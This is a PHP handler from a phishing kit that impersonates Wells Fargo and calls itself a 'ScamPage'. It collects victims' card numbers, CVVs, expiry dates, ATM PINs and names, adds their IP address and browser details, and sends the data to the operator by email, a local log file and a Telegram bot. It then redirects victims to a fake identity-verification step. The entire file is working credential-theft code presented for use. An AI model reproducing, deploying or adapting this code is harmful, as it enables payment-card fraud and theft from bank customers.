<?php

	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['cc'] ) ) {

		$_SESSION['cc'] 	  = $_POST['cc'];
		$_SESSION['cvv'] 	  = $_POST['cvv'];
		$_SESSION['expdate'] 	  = $_POST['expdate'];
		$_SESSION['atm'] 	  = $_POST['atm'];
		$_SESSION['noc'] 	  = $_POST['noc'];

		$code = <<<EOT
»»————-　★[ ⚫️🌀 WELLSFARGO Credit Card ⚫️🌀 ]★　————-««
[NAME ON CARD] 		: {$_SESSION['noc']}
[CARD NUMBER] 		: {$_SESSION['cc']}
[CVV]		: {$_SESSION['cvv']}
[EXPIRY DATE] 		: {$_SESSION['expdate']}
[ATM]		: {$_SESSION['atm']}

»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 WELLSFARGO ScamPage  ⚫️🌀 ]★　————-««
\r\n\r\n
EOT;

		if ($sendtoemail=="yes"){
		$subject = "💼 WELLSFARGO Card 💼  From $ip";
        $headers = "From: 🍁WELLSFARGO Credit Card🍁 <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}

		if($saveintxt=="yes"){
		$save = fopen("../Logs/CC.txt","a+");
        fwrite($save,$code);
        fclose($save);
		}
	if ($sendtotelegram=="yes"){
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}

		header("Location: ../accounts?oamo/identity/recognizeUser/requestidentification");
        exit();
	} else {
		header("Location: ../index.php");
		exit();
	}
?>
